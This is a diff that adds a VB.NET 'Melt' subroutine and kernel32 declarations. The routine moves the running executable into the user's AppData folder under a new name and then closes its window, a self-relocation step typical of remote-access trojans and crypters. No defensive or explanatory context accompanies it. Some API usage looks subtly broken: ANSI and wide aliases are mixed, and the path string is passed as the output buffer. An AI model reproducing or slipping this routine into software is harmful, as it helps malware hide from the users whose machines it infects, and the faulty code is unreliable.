@@ -1,0 +1,12 @@
+Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
+Public Declare Function MoveFile Lib "kernel32" Alias "MoveFileExW" (<[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpExistingFileName As String, <[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpNewFileName As String, ByVal dwFlags As Long) As Integer
+    
+    Public Shared Sub Melt(ByVal Name As String)
+        Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+        If Not IO.File.Exists(NewFolder & "\" & Name) Then
+            MoveFile(Microsoft.VisualBasic.Left(Application.ExecutablePath, _
+            GetModuleFileName(0, Application.ExecutablePath, 256)), _
+            NewFolder & "\" & Name, 8)
+            System.Diagnostics.Process.GetCurrentProcess.CloseMainWindow()
+        End If
+    End Sub
